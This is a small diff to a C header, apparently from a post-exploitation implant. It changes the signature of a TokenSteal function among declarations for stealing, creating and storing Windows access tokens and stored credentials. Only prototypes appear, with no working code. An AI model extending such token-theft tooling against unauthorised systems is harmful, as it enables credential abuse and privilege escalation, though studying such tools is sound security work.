@@ -49,7 +49,7 @@ BOOL             TokenSetPrivilege( LPSTR Privilege, BOOL Enable );
 // Token Vault
 DWORD            TokenAdd( HANDLE hToken, LPSTR DomainUser, SHORT Type, DWORD dwProcessID, LPSTR User, LPSTR Domain, LPSTR Password );
 BOOL             TokenRemove( DWORD TokenID );
-HANDLE           TokenSteal( DWORD dwTargetPID );
+HANDLE           TokenSteal( DWORD ProcessID, HANDLE TargetHandle );
 HANDLE           TokenMake( LPSTR User, LPSTR Password, LPSTR Domain );
 PTOKEN_LIST_DATA TokenGet( DWORD TokenID );
 VOID             TokenClear( );
